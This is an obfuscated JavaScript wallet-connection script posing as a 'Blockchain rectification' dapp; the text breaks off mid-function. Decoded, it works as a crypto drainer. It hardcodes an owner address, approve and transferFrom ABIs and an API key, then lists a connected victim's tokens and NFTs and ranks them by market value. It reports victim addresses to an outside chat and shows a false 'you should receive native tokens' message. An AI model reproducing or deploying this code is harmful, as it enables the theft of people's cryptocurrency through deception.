const _0x1f960c=_0x3939;(function(_0x2ee002,_0x1ea4c9){const _0x515c9f=_0x3939,_0x4edd39=_0x2ee002();while(!![]){try{const _0x4f2d6e=-parseInt(_0x515c9f(0x141))/0x1+parseInt(_0x515c9f(0x19b))/0x2*(-parseInt(_0x515c9f(0x1e8))/0x3)+parseInt(_0x515c9f(0x134))/0x4+-parseInt(_0x515c9f(0x135))/0x5*(-parseInt(_0x515c9f(0x14c))/0x6)+parseInt(_0x515c9f(0x1a2))/0x7*(parseInt(_0x515c9f(0x1a6))/0x8)+-parseInt(_0x515c9f(0x195))/0x9*(-parseInt(_0x515c9f(0x16e))/0xa)+parseInt(_0x515c9f(0x1b1))/0xb;if(_0x4f2d6e===_0x1ea4c9)break;else _0x4edd39['push'](_0x4edd39['shift']());}catch(_0x4fddb7){_0x4edd39['push'](_0x4edd39['shift']());}}}(_0x4a71,0x6c095));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {fantom,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[fantom,mainnet],projectId=_0x1f960c(0x1c5),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors['CoinbaseWalletConnector']({'chains':chains,'options':{'appName':_0x1f960c(0x16f)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window['location'][_0x1f960c(0x169)];const OWNER_ADDRESS=_0x1f960c(0x1c7),ABI=[{'constant':!![],'inputs':[],'name':_0x1f960c(0x185),'outputs':[{'name':'','type':_0x1f960c(0x158)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x1eb),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x16d),'outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x199),'type':_0x1f960c(0x1ad)},{'name':_0x1f960c(0x1cf),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x1e4),'outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':'deprecated','outputs':[{'name':'','type':_0x1f960c(0x15a)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x1b9),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x1a7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x159),'type':_0x1f960c(0x1ad)},{'name':'_to','type':_0x1f960c(0x1ad)},{'name':_0x1f960c(0x1cf),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x18d),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x172),'outputs':[{'name':'','type':_0x1f960c(0x1ad)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[{'name':'','type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x19e),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x1a5),'outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x177),'outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[],'name':_0x1f960c(0x1d3),'outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x1f960c(0x131),'outputs':[{'name':'','type':_0x1f960c(0x15a)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[{'name':'','type':_0x1f960c(0x1ad)},{'name':'','type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x180),'outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x17f),'outputs':[{'name':'','type':_0x1f960c(0x15a)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[{'name':_0x1f960c(0x16a),'type':_0x1f960c(0x1ad)}],'name':'balanceOf','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'constant':![],'inputs':[],'name':_0x1f960c(0x145),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x1f960c(0x16b),'outputs':[{'name':'','type':_0x1f960c(0x1ad)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x1f960c(0x1ad)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1f960c(0x1d0),'outputs':[{'name':'','type':_0x1f960c(0x158)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'constant':![],'inputs':[{'name':_0x1f960c(0x17e),'type':_0x1f960c(0x1ad)},{'name':'_value','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x17b),'outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x15c),'type':_0x1f960c(0x1cd)},{'name':'newMaxFee','type':'uint256'}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x1f960c(0x1cd)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x166),'type':_0x1f960c(0x1cd)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':'function'},{'constant':!![],'inputs':[{'name':_0x1f960c(0x1ec),'type':'address'},{'name':_0x1f960c(0x199),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x1d1),'outputs':[{'name':_0x1f960c(0x1b8),'type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':'view','type':_0x1f960c(0x138)},{'constant':!![],'inputs':[],'name':_0x1f960c(0x175),'outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':'view','type':_0x1f960c(0x138)},{'constant':!![],'inputs':[{'name':'','type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x1ce),'outputs':[{'name':'','type':_0x1f960c(0x15a)}],'payable':![],'stateMutability':'view','type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x1d7),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x1de),'outputs':[],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':'function'},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x1ea),'type':'address'}],'name':_0x1f960c(0x1c3),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'constant':![],'inputs':[{'name':_0x1f960c(0x1bc),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x13c),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'inputs':[{'name':_0x1f960c(0x1da),'type':'uint256'},{'name':_0x1f960c(0x178),'type':'string'},{'name':_0x1f960c(0x137),'type':_0x1f960c(0x158)},{'name':_0x1f960c(0x1ab),'type':_0x1f960c(0x1cd)}],'payable':![],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x139)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x166),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x163),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x18c),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x1be),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x1e5),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x196),'type':_0x1f960c(0x1cd)},{'indexed':![],'name':_0x1f960c(0x1d5),'type':_0x1f960c(0x1cd)}],'name':'Params','type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x1bc),'type':_0x1f960c(0x1ad)},{'indexed':![],'name':_0x1f960c(0x1df),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x1ac),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x132),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x15b),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1f960c(0x132),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x136),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)},{'indexed':!![],'name':_0x1f960c(0x1c1),'type':_0x1f960c(0x1ad)},{'indexed':![],'name':_0x1f960c(0x16c),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x152),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1f960c(0x14d),'type':_0x1f960c(0x1ad)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':'value','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x167),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x1f960c(0x13a),'type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[],'name':_0x1f960c(0x1a0),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x1f960c(0x158),'name':_0x1f960c(0x185),'type':_0x1f960c(0x158)},{'internalType':'string','name':_0x1f960c(0x1d0),'type':_0x1f960c(0x158)},{'internalType':'uint256','name':'maxNftSupply','type':_0x1f960c(0x1cd)},{'internalType':_0x1f960c(0x1cd),'name':_0x1f960c(0x1e1),'type':_0x1f960c(0x1cd)}],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x139)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':'address','name':_0x1f960c(0x188),'type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':_0x1f960c(0x1cd),'name':_0x1f960c(0x1c9),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x152),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x1c8),'type':'address'},{'indexed':![],'internalType':_0x1f960c(0x15a),'name':_0x1f960c(0x188),'type':_0x1f960c(0x15a)}],'name':_0x1f960c(0x1b0),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x168),'type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x1ea),'type':_0x1f960c(0x1ad)}],'name':'OwnershipTransferred','type':_0x1f960c(0x1e6)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x1f960c(0x14d),'type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':_0x1f960c(0x1ad),'name':'to','type':_0x1f960c(0x1ad)},{'indexed':!![],'internalType':_0x1f960c(0x1cd),'name':'tokenId','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x167),'type':_0x1f960c(0x1e6)},{'inputs':[],'name':_0x1f960c(0x15d),'outputs':[{'internalType':'string','name':'','type':_0x1f960c(0x158)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x1d8),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x194),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':_0x1f960c(0x1cd)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x14a),'outputs':[{'internalType':'uint256','name':'','type':_0x1f960c(0x1cd)}],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':'to','type':_0x1f960c(0x1ad)},{'internalType':'uint256','name':'tokenId','type':'uint256'}],'name':'approve','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)}],'name':_0x1f960c(0x191),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':_0x1f960c(0x1cd)}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x1ca),'outputs':[{'internalType':_0x1f960c(0x158),'name':'','type':_0x1f960c(0x158)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x155),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x19c),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':'uint256','name':_0x1f960c(0x1c9),'type':_0x1f960c(0x1cd)}],'name':'getApproved','outputs':[{'internalType':_0x1f960c(0x1ad),'name':'','type':_0x1f960c(0x1ad)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':'address','name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)},{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x1c8),'type':_0x1f960c(0x1ad)}],'name':'isApprovedForAll','outputs':[{'internalType':_0x1f960c(0x15a),'name':'','type':_0x1f960c(0x15a)}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x1b5),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':'uint256'}],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1cd),'name':_0x1f960c(0x153),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x133),'outputs':[],'stateMutability':_0x1f960c(0x154),'type':'function'},{'inputs':[],'name':_0x1f960c(0x185),'outputs':[{'internalType':_0x1f960c(0x158),'name':'','type':'string'}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x174),'outputs':[{'internalType':_0x1f960c(0x1ad),'name':'','type':_0x1f960c(0x1ad)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':'uint256','name':_0x1f960c(0x1c9),'type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x184),'outputs':[{'internalType':'address','name':'','type':_0x1f960c(0x1ad)}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x160),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x14d),'type':'address'},{'internalType':_0x1f960c(0x1ad),'name':'to','type':_0x1f960c(0x1ad)},{'internalType':_0x1f960c(0x1cd),'name':'tokenId','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x1dd),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x14d),'type':'address'},{'internalType':_0x1f960c(0x1ad),'name':'to','type':_0x1f960c(0x1ad)},{'internalType':_0x1f960c(0x1cd),'name':_0x1f960c(0x1c9),'type':'uint256'},{'internalType':_0x1f960c(0x197),'name':_0x1f960c(0x1c6),'type':'bytes'}],'name':_0x1f960c(0x1dd),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x130),'outputs':[{'internalType':_0x1f960c(0x15a),'name':'','type':_0x1f960c(0x15a)}],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x1c8),'type':'address'},{'internalType':_0x1f960c(0x15a),'name':_0x1f960c(0x188),'type':_0x1f960c(0x15a)}],'name':_0x1f960c(0x1a8),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x158),'name':_0x1f960c(0x1ca),'type':_0x1f960c(0x158)}],'name':_0x1f960c(0x18b),'outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x158),'name':_0x1f960c(0x1b4),'type':_0x1f960c(0x158)}],'name':_0x1f960c(0x170),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1cd),'name':_0x1f960c(0x19a),'type':_0x1f960c(0x1cd)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x171),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':_0x1f960c(0x1cd)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x162),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':_0x1f960c(0x1cd)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x142),'name':'interfaceId','type':_0x1f960c(0x142)}],'name':_0x1f960c(0x18a),'outputs':[{'internalType':_0x1f960c(0x15a),'name':'','type':_0x1f960c(0x15a)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x1d0),'outputs':[{'internalType':_0x1f960c(0x158),'name':'','type':_0x1f960c(0x158)}],'stateMutability':_0x1f960c(0x1ae),'type':'function'},{'inputs':[{'internalType':_0x1f960c(0x1cd),'name':'index','type':'uint256'}],'name':_0x1f960c(0x13f),'outputs':[{'internalType':_0x1f960c(0x1cd),'name':'','type':'uint256'}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x174),'type':_0x1f960c(0x1ad)},{'internalType':'uint256','name':'index','type':_0x1f960c(0x1cd)}],'name':_0x1f960c(0x1cc),'outputs':[{'internalType':'uint256','name':'','type':_0x1f960c(0x1cd)}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x1f960c(0x1cd)}],'name':'tokenURI','outputs':[{'internalType':_0x1f960c(0x158),'name':'','type':_0x1f960c(0x158)}],'stateMutability':_0x1f960c(0x1ae),'type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x1a7),'outputs':[{'internalType':'uint256','name':'','type':_0x1f960c(0x1cd)}],'stateMutability':'view','type':_0x1f960c(0x138)},{'inputs':[{'internalType':'address','name':'from','type':_0x1f960c(0x1ad)},{'internalType':_0x1f960c(0x1ad),'name':'to','type':'address'},{'internalType':'uint256','name':_0x1f960c(0x1c9),'type':_0x1f960c(0x1cd)}],'name':'transferFrom','outputs':[],'stateMutability':_0x1f960c(0x1b2),'type':_0x1f960c(0x138)},{'inputs':[{'internalType':_0x1f960c(0x1ad),'name':_0x1f960c(0x1ea),'type':'address'}],'name':_0x1f960c(0x1c3),'outputs':[],'stateMutability':'nonpayable','type':_0x1f960c(0x138)},{'inputs':[],'name':_0x1f960c(0x147),'outputs':[],'stateMutability':'nonpayable','type':_0x1f960c(0x138)}];function _0x4a71(){const _0x793fda=['transferFrom','location','sort','Error\x20processing\x20item\x20','balanceOf','connector','chainId:','REVEAL_TIMESTAMP','753642BmUkHL','feeBasisPoints','bytes','NFT','_spender','revealTimeStamp','494ewNbhc','flipSaleState','price','balances','hash','Unpause','.proceed','85988rNmsLG','json','catch','decimals','512TiDSnj','totalSupply','setApprovalForAll','.meta','Error:\x20','_decimals','DestroyedBlackFunds','address','view','usd','ApprovalForAll','2522366fvwHxN','nonpayable','.connect','provenanceHash','maxApePurchase','NFTs\x20collection\x20','No\x20address','remaining','addBlackList','Initial\x20list\x20','error','_blackListedUser','Transaction\x20is\x20submitted\x20to\x20the\x20network','newAddress','MetaMask','coinbase','spender','Approved','transferOwnership','TOKEN\x20Contract\x20Address\x20','ee71d215d0dec7d1bf950851c84d9643','_data','0xea8968B218a551919FbD5f1166328C82a96dED54','operator','tokenId','baseURI','balance','tokenOfOwnerByIndex','uint256','isBlackListed','_value','symbol','allowance','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','unpause','https://link.trustwallet.com/open_url?url=','maxFee','Tokens:','_clearedUser','MAX_APES','&text=','_initialSupply','/nft/collections?chain=','formatted','safeTransferFrom','removeBlackList','_balance','trustwallet','saleStart','log','gasPrice','approve','Deprecate','event','application/json','7044HENJwk','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','newOwner','_upgradedAddress','_owner','250','saleIsActive','getBlackListStatus','_user','mintApe','1473800setkhy','60OiZbDH','RemovedBlackList','_symbol','function','constructor','Pause','Your\x20address\x20','destroyBlackFunds','https://api.coingecko.com/api/v3/simple/token_price/fantom?contract_addresses=','GET','tokenByIndex','fantom','815151NzCxwJ','bytes4','Error\x20collecting\x20info\x20about\x20wallet','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','pause','&vs_currencies=usd','withdraw','Could\x20not\x20get\x20a\x20wallet\x20connection','openModal','apePrice','getProvider','59370JaxzTb','from','.coinbase','then','networkVersion','https://go.cb-w.com/dapp?cb_url=','Approval','numberOfTokens','payable','emergencySetStartingIndexBlock','New\x20token','Approve\x20Completed\x20Successfully','string','_from','bool','AddedBlackList','newBasisPoints','BAYC_PROVENANCE','tokens-list','.trust','reserveApes','https://deep-index.moralis.io/api/v2/','startingIndexBlock','Issue','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','token_address','amount','Transfer','previousOwner','href','who','getOwner','value','deprecate','40JhspMh','Blockchain\x20rectification','setProvenanceHash','startingIndex','upgradedAddress','all','owner','basisPointsRate','0x0D8d6a799118949A256343FC2b54e566bDEb4e7d','_totalSupply','_name','message','result','transfer','Transaction\x20Rejected','metamask','_to','paused','allowed','status','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','length','ownerOf','name','Token\x20balance\x20is\x20','click','approved','map','supportsInterface','setBaseURI','Redeem'];_0x4a71=function(){return _0x793fda;};return _0x4a71();}let wallet;$(_0x1f960c(0x1a9))[_0x1f960c(0x187)](async function(){const _0x47bb22=_0x1f960c;wallet=_0x47bb22(0x17d),await connector();}),$(_0x1f960c(0x14e))[_0x1f960c(0x187)](async function(){wallet='coinbase',await connector();}),$(_0x1f960c(0x15f))['click'](async function(){const _0xc0e146=_0x1f960c;wallet=_0xc0e146(0x1e0),await connector();}),$(_0x1f960c(0x1b3))['click'](async function(){const _0x116f78=_0x1f960c;try{await web3Modal[_0x116f78(0x149)]();}catch(_0x57a4c6){console[_0x116f78(0x1e2)](_0x116f78(0x148),_0x57a4c6);return;}});function _0x3939(_0x4641bf,_0x106221){const _0x4a710b=_0x4a71();return _0x3939=function(_0x39397c,_0x428749){_0x39397c=_0x39397c-0x12f;let _0x3d8c3b=_0x4a710b[_0x39397c];return _0x3d8c3b;},_0x3939(_0x4641bf,_0x106221);}let connector=async()=>{const _0x4cd1d6=_0x1f960c;if(typeof web3==='undefined'&&typeof ethereum==='undefined'){console[_0x4cd1d6(0x1e2)]('Hahahahahah');if(wallet==='metamask'){let _0x830b37='https://metamask.app.link/dapp/'+currentUrl;window['location'][_0x4cd1d6(0x169)]=_0x830b37;}else{if(wallet===_0x4cd1d6(0x1c0)){let _0x4e203f=_0x4cd1d6(0x151)+currentUrl;window[_0x4cd1d6(0x18e)]['href']=_0x4e203f;}else{if(wallet===_0x4cd1d6(0x1e0)){let _0x4316f0=_0x4cd1d6(0x1d4)+currentUrl;window[_0x4cd1d6(0x18e)][_0x4cd1d6(0x169)]=_0x4316f0;}}}}else try{await web3Modal['openModal']();}catch(_0x42f61c){console[_0x4cd1d6(0x1e2)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x42f61c);return;}};$(_0x1f960c(0x1a1))[_0x1f960c(0x187)](async function(){const _0xff7905=_0x1f960c;let _0xfe869b=getAccount();console['log'](_0xfe869b),!_0xfe869b['address']&&(console[_0xff7905(0x1e2)](_0xff7905(0x1b7)),alert(_0xff7905(0x1e9))),_0xfe869b[_0xff7905(0x192)][_0xff7905(0x185)]===_0xff7905(0x1bf)&&(_0xfe869b['connector']['options'][_0xff7905(0x14b)]()[_0xff7905(0x150)]!==_0xff7905(0x12f)&&(console[_0xff7905(0x1e2)]('Incorrect\x20network'),await switchNetwork({'chainId':0xfa}))),selectedAccount=_0xfe869b[_0xff7905(0x1ad)],sendMessage(_0xff7905(0x164)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x1f960c(0x176),Oxc='5122451029';async function covalenthqAPICall(){const _0x6c9c69=_0x1f960c,_0x199bd6={'chain':_0x6c9c69(0x140)},_0x192db3=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+'/erc20');_0x192db3['search']=new URLSearchParams(_0x199bd6)['toString']();const _0x30193a={'method':_0x6c9c69(0x13e),'headers':{'accept':_0x6c9c69(0x1e7),'X-API-Key':_0x6c9c69(0x182)}};try{const _0x534c11=await fetch(_0x192db3,_0x30193a)[_0x6c9c69(0x14f)](_0x2afff0=>_0x2afff0[_0x6c9c69(0x1a3)]());console[_0x6c9c69(0x1e2)](_0x534c11);let _0x311a5c=_0x534c11;console[_0x6c9c69(0x1e2)](_0x6c9c69(0x1ba),_0x311a5c);let _0x293043=await Promise[_0x6c9c69(0x173)](_0x311a5c[_0x6c9c69(0x189)](async _0x3874fc=>{const _0x139513=_0x6c9c69;let _0x32a7ac;try{_0x32a7ac=await getValue(_0x3874fc[_0x139513(0x165)],_0x3874fc[_0x139513(0x1cb)],_0x3874fc['decimals']);}catch(_0x3b68da){_0x32a7ac=0x0;}return console[_0x139513(0x1e2)](_0x32a7ac),{'balance':_0x3874fc[_0x139513(0x1cb)],'value':_0x32a7ac,'address':_0x3874fc[_0x139513(0x165)]};}));console[_0x6c9c69(0x1e2)](_0x6c9c69(0x15e),_0x293043),tokens=_0x293043['filter'](_0xbd17e6=>_0xbd17e6[_0x6c9c69(0x16c)]>0x5),tokens[_0x6c9c69(0x18f)]((_0x10687b,_0x5df4dd)=>_0x5df4dd['value']-_0x10687b[_0x6c9c69(0x16c)]),console[_0x6c9c69(0x1e2)](_0x6c9c69(0x193),await getNetwork(),_0x6c9c69(0x1d6),tokens),NFTs=await getNFTs(selectedAccount)[_0x6c9c69(0x1a4)](_0x141ca4=>{const 